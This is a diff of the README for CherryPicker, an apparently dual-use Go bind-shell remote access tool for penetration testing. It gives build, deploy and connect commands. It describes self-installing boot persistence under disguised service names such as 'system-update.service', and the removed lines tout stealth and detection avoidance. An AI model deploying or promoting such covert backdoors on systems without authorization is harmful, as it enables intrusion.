@@ -1,368 +1,154 @@
-  ____ _                          ____  _      _             
+```text
+    ____ _                          ____  _      _             
  / ___| |__   ___ _ __ _ __ _   _|  _ \(_) ___| | _____ _ __ 
 | |   | '_ \ / _ \ '__| '__| | | | |_) | |/ __| |/ / _ \ '__|
 | |___| | | |  __/ |  | |  | |_| |  __/| | (__|   <  __/ |   
  \____|_| |_|\___|_|  |_|   \__, |_|   |_|\___|_|\_\___|_|   
-                            |___/             
+                                                        |___/             
+```
 
 # CherryPicker
 
-Authenticated bind shell for authorized penetration testing. Deploy a listener on target systems, then connect remotely to establish interactive shell access.
+Authenticated bind shell for authorized penetration testing — deploy a listener on authorized target systems, then connect remotely to establish an interactive shell.
 
-## ⚠️ Legal Disclaimer
+> ⚠️ Legal: Use this tool only on systems you own or where you have explicit written permission. Unauthorized use is illegal.
 
-This tool is designed **exclusively for authorized penetration testing** and security research. Unauthorized use of this tool against systems you don't own or have explicit permission to test is **illegal** and punishable by law.
-
-**Only use this tool:**
-- On systems you own
-- During authorized penetration tests with written permission
-- In controlled lab environments
-
-## What It Does
-
-CherryPicker is a two-part remote access tool consisting of:
-
-1. **Target Module** - Deployed on authorized target systems, listens on a TCP port
-2. **Attacker Module** - Run from your attack machine, connects to target and provides shell access
-
-Communication is protected by challenge-response authentication using a shared secret key.
-
-## How It Works
-
-```
-1. Deploy target module on authorized system → Listens on port
-2. Run attacker module from your machine → Connects to target
-3. Authentication handshake → SHA256 challenge-response
-4. Interactive shell spawned → Full command execution
-```
+---
 
 ## Quick Start
 
-### 1. Build Both Modules
-
+### Build
 ```bash
-# Build target module (to deploy on target)
-cd target
-go build -o cherrypicker-target
+# Build target (to deploy on target)
+cd target && go build -o cherrypicker-target
 
-# Build attacker module (for your machine)
-cd ../attacker
-go build -o cherrypicker-attacker
+# Build attacker (from your machine)
+cd ../attacker && go build -o cherrypicker-attacker
 ```
 
-**Cross-compile for different platforms:**
+### Deploy target (authorized systems only)
 ```bash
-# Linux target
-cd target && GOOS=linux GOARCH=amd64 go build -o cherrypicker-target-linux
-
-# Windows target
-cd target && GOOS=windows GOARCH=amd64 go build -o cherrypicker-target.exe
-
-# macOS target (M1/M2)
-cd target && GOOS=darwin GOARCH=arm64 go build -o cherrypicker-target-mac
-```
-
-### 2. Deploy Target Module
-
-Copy `cherrypicker-target` to your authorized target system.
-
-**Option A: Run manually**
-```bash
-# Port and signature are now REQUIRED
+# Run (port and signature required)
 ./cherrypicker-target -p 8888 -s "YourSecretKey123"
 
-# Example with different port
-./cherrypicker-target -p 31337 -s "Xk9m#pL2$vN8@qR5"
+# Install as service/daemon (requires admin/root)
+sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"
 ```
 
-**Option B: Install as persistent service (auto-start on boot)**
+### Connect from attacker
 ```bash
-# Linux (requires root) - port and signature REQUIRED
-sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"
-
-# macOS (requires root)
-sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"
-
-# Windows (requires admin)
-cherrypicker-target.exe -install -p 8888 -s "YourSecretKey123"
-```
-
-The `-install` flag will:
-- ✅ Detect OS automatically (Linux/macOS/Windows)
-- ✅ Install as system service/daemon
-- ✅ Start immediately
-- ✅ Auto-start on every boot
-- ✅ Restart automatically if crashed
-- ✅ Use generic service names to blend in
-
-**Service names:**
-- Linux: `system-update.service`
-- macOS: `com.system.update`
-- Windows: `SystemUpdate`
-
-### 3. Connect from Attacker
-
-From your attack machine:
-
-```bash
-# Connect (both target and port are required)
-./cherrypicker-attacker -t 192.168.1.50 -p 9999
-
-# With custom authentication signature (must match target)
 ./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourSecretKey123"
-
-# With connection timeout
-./cherrypicker-attacker -t 192.168.1.50 -p 9999 -timeout 30
 ```
 
-If authentication succeeds, you'll get an interactive shell on the target.
+---
 
-## Command-Line Options
+## What it Does
 
-### Target Module
-| Flag | Default | Required | Description |
-|------|---------|----------|-------------|
-| `-p` | - | ✅ | Port to listen on |
-| `-s` | - | ✅ | Authentication signature/key (min 10 chars) |
-| `-install` | false | ❌ | Install as persistent service/daemon (requires root/admin) |
-| `-tls` | true | ❌ | Enable TLS encryption (recommended) |
-| `-cert` | - | ❌ | Path to TLS certificate file (optional, auto-generates if not provided) |
-| `-key` | - | ❌ | Path to TLS private key file (optional, auto-generates if not provided) |
+- Target module: listens on a TCP port on authorized targets.
+- Attacker module: connects to target and establishes an interactive shell.
+- Authentication: SHA256 challenge-response using a shared secret.
+- Transport: TLS 1.2+ by default (self-signed certs auto-generated).
 
-### Attacker Module
-| Flag | Default | Required | Description |
-|------|---------|----------|-------------|
-| `-t` | - | ✅ | Target IP address |
-| `-p` | - | ✅ | Target port number |
-| `-s` | - | ✅ | Authentication signature/key (must match target) |
-| `-timeout` | 10 | ❌ | Connection timeout in seconds |
-| `-tls` | true | ❌ | Use TLS encryption (must match target) |
-| `-insecure` | true | ❌ | Skip TLS certificate verification (for self-signed certs) |
+---
 
-## Architecture
+## Command-line Options
 
+### Target
+| Flag | Required | Description |
+|------|----------|-------------|
+| `-p` | Yes | Port to listen on |
+| `-s` | Yes | Authentication signature/key (min 10 chars) |
+| `-install` | No | Install as service/daemon |
+| `-tls` | No (default: true) | Enable TLS |
+| `-cert` | No | TLS certificate path |
+| `-key` | No | TLS key path |
+
+### Attacker
+| Flag | Required | Description |
+|------|----------|-------------|
+| `-t` | Yes | Target IP address |
+| `-p` | Yes | Target port |
+| `-s` | Yes | Authentication signature/key |
+| `-timeout` | No (default: 10s) | Connection timeout |
+| `-tls` | No (default: true) | Use TLS |
+| `-insecure` | No (default: true) | Skip cert verification (for self-signed certs) |
+
+---
+
+## Authentication & Transport
+
+- Challenge-response: target sends a random nonce; attacker returns SHA256(nonce + shared_key). Match spawns shell.
+- TLS (default): protects handshake and all session traffic. Use `-cert`/`-key` for custom certs. Use `-insecure=false` on attacker to enforce validation.
+
+---
+
+## Architecture (simplified)
 ```
-┌─────────────────┐                    ┌──────────────────┐
-│  Attacker       │                    │  Target          │
-│  (Your Machine) │                    │  (Remote System) │
-│                 │                    │                  │
-│  ./attacker     │───── Connect ─────→│  :9999           │
-│  -target IP     │                    │  (listening)     │
-│  -port 9999     │                    │                  │
-│                 │←──── Challenge ────│  Random nonce    │
-│                 │                    │                  │
-│  SHA256(nonce+  │───── Response ────→│  Verify hash     │
-│         key)    │                    │                  │
-│                 │                    │                  │
-│                 │←──── AUTH_OK ──────│  Spawn shell     │
-│                 │                    │                  │
-│  Interactive    │←──── Shell I/O ────│  /bin/sh or      │
-│  Shell          │                    │  cmd.exe         │
-└─────────────────┘                    └──────────────────┘
+Attacker                Network                Target
+---------               -------                ------
+cherrypicker-attacker  ── connect ──▶  cherrypicker-target
+        - SHA256(response)  ◀─ challenge ─────
+        - Interactive shell  ◀─ shell I/O ─────
 ```
 
-## Authentication & Encryption
-
-### Authentication
-Uses **SHA256 challenge-response** to prevent unauthorized access:
-
-1. Target generates random challenge (16 bytes hex)
-2. Attacker receives challenge
-3. Attacker computes: `SHA256(challenge + shared_key)`
-4. Attacker sends response hash
-5. Target verifies hash matches expected value
-6. If valid → shell spawned, If invalid → connection closed
-
-**Both sides must use the exact same authentication key.**
-
-### Transport Encryption (TLS)
-All traffic is encrypted using **TLS 1.2+** by default:
-
-- **Self-signed certificates**: Auto-generated on target startup (2048-bit RSA)
-- **User-provided certificates**: Use `-cert` and `-key` flags for custom certs
-- **Cipher suites**: Modern ECDHE+AES-GCM ciphers only
-- **Certificate validation**: Disabled by default on attacker (use `-insecure=false` for strict validation)
-
-**TLS protects:**
-- ✅ Authentication handshake
-- ✅ Shell commands sent to target
-- ✅ Command output returned to attacker
-- ✅ All session data
-
-**Using TLS:**
-```bash
-# Target with auto-generated cert (default)
-./cherrypicker-target -p 8888 -s "YourKey"
-
-# Target with custom certificate
-./cherrypicker-target -p 8888 -s "YourKey" -cert server.crt -key server.key
-
-# Disable TLS (not recommended)
-./cherrypicker-target -p 8888 -s "YourKey" -tls=false
-
-# Attacker (default matches target TLS settings)
-./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourKey"
-
-# Attacker with strict cert verification
-./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourKey" -insecure=false
-
-# Attacker without TLS (if target has -tls=false)
-./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourKey" -tls=false
-```
+---
 
 ## Features
 
-- ✅ Challenge-response authentication (SHA256)
-- ✅ **TLS 1.2+ encryption** - All traffic encrypted by default
-- ✅ **Self-signed certificates** - Auto-generated ephemeral certs
-- ✅ Cross-platform (Linux, macOS, Windows)
-- ✅ **Self-installing persistence** - One command to install as service/daemon
-- ✅ **Auto-start on boot** - Survives reboots automatically
-- ✅ **Auto-restart on crash** - Maintains availability
-- ✅ Automatic shell detection per OS
-- ✅ IPv6 support
-- ✅ Configurable ports and keys
-- ✅ Connection timeouts
-- ✅ System information banner
-- ✅ No hardcoded credentials
-- ✅ Generic service names for stealth
+- SHA256 challenge-response auth
+- TLS 1.2+ (auto self-signed certs)
+- Cross-platform (Linux/macOS/Windows)
+- Optional persistent install as service/daemon
+- Auto-restart on crash, auto-start on boot
+- IPv6 support, configurable ports and keys
 
-## Security Considerations
+---
 
-⚠️ **All parameters are now required - no insecure defaults!**
+## Security Notes
 
-- Use strong, random signatures (minimum 10 characters enforced)
-- Signatures are case-sensitive
-- Target listens on all interfaces (0.0.0.0) - consider firewall rules
-- Use non-standard ports to avoid detection
-- Monitor connection attempts
-- **TLS encryption enabled by default** - All traffic encrypted with modern ciphers
-- Self-signed certificates auto-generated (2048-bit RSA)
-- Use custom certificates for production deployments
-- Consider SSH tunneling for defense-in-depth
+- All parameters are required; use strong random signatures (min 10 chars).
+- Target listens on 0.0.0.0 by default — restrict with firewall rules.
+- Prefer custom certs and `-insecure=false` for production.
+- Monitor and log connection attempts.
 
-**Certificate Security:**
-- Self-signed certs are ephemeral (generated each run unless using `-cert`/`-key`)
-- Attacker uses `-insecure=true` by default (accepts any cert) for ease of use
-- Use `-insecure=false` for production to enforce certificate validation
-- Custom certificates recommended for enterprise deployments
-
-## Example Usage Scenarios
-
-**Basic deployment:**
-```bash
-# On target (192.168.1.50) - all parameters required
-./cherrypicker-target -p 9999 -s "MySecretSignature"
-
-# On attacker
-./cherrypicker-attacker -t 192.168.1.50 -p 9999 -s "MySecretSignature"
-```
-
-**Persistent deployment (auto-start on boot):**
-```bash
-# On target - install as service
-sudo ./cherrypicker-target -install -p 31337 -s "Xk9m#pL2$vN8@qR5"
-
-# On attacker - connect anytime
-./cherrypicker-attacker -t 192.168.1.50 -p 31337 -s "Xk9m#pL2$vN8@qR5"
-
-# Target will auto-start after reboot, no manual intervention needed
-```
-
-**Secure deployment with custom signature:**
-```bash
-# On target with TLS (default)
-./cherrypicker-target -p 31337 -s "Xk9m#pL2$vN8@qR5"
-
-# On attacker
-./cherrypicker-attacker -t 192.168.1.50 -p 31337 -s "Xk9m#pL2$vN8@qR5"
-```
-
-**Enterprise deployment with custom certificates:**
-```bash
-# Generate your own certificate
-openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
-
-# On target with custom cert
-./cherrypicker-target -p 8443 -s "YourEnterpriseKey" -cert server.crt -key server.key
-
-# On attacker with strict cert verification
-./cherrypicker-attacker -t 192.168.1.50 -p 8443 -s "YourEnterpriseKey" -insecure=false
-```
-
-**IPv6 support:**
-```bash
-./cherrypicker-attacker -t 2001:db8::1 -p 9999 -s "YourKey"
-./cherrypicker-attacker -t fe80::1 -p 9999 -s "YourKey"
-```
+---
 
 ## Troubleshooting
 
-**"Connection refused"**
-- Verify target module is running
-- Check firewall rules on target
-- Confirm IP address and port are correct
+- "Connection refused": ensure target module is running and firewall allows the port.
+- "Authentication failed": verify identical `-s` values on both sides (case-sensitive).
+- "Connection timeout": increase `-timeout` or verify network reachability.
 
-**"Authentication failed"**
-- Ensure both sides use identical `-s` values
-- Signatures are case-sensitive
-- No extra spaces in signature strings
-
-**"Connection timeout"**
-- Target may be unreachable
-- Increase `-timeout` value
-- Test basic connectivity with `ping` or `telnet`
-
-**"Port already in use"**
-- Another service is using the port
-- Choose a different port number
-- Check with: `netstat -tulpn | grep <port>` (Linux)
-
-**Remove installed persistence:**
+Remove persistence (examples):
 ```bash
 # Linux
 sudo systemctl stop system-update
 sudo systemctl disable system-update
 sudo rm /etc/systemd/system/system-update.service
-
-# macOS
-sudo launchctl unload /Library/LaunchDaemons/com.system.update.plist
-sudo rm /Library/LaunchDaemons/com.system.update.plist
-
-# Windows
-sc stop SystemUpdate
-sc delete SystemUpdate
 ```
 
-## Building from Source
+---
+
+## Building from Source & Project Layout
 
 ```bash
-# Clone repository
 git clone https://github.com/azizhayat37/cherrypicker.git
 cd cherrypicker
-
-# Initialize Go module (if needed)
-go mod init cherrypicker
-go mod tidy
-
-# Build both modules
 cd target && go build -o cherrypicker-target
 cd ../attacker && go build -o cherrypicker-attacker
 ```
 
-## Project Structure
-
+Repository layout:
 ```
 cherrypicker/
 ├── target/
-│   └── main.go          # Target listener module
+│   └── main.go
 ├── attacker/
-│   └── main.go          # Attacker client module
-├── README.md            # This file
-├── USAGE.md            # Detailed usage guide
+│   └── main.go
+├── README.md
 └── LICENSE
 ```
 
-## License
+---
 
-For authorized penetration testing use only. See LICENSE file.
+For detailed usage and examples see USAGE.md. License and allowed use described in LICENSE.
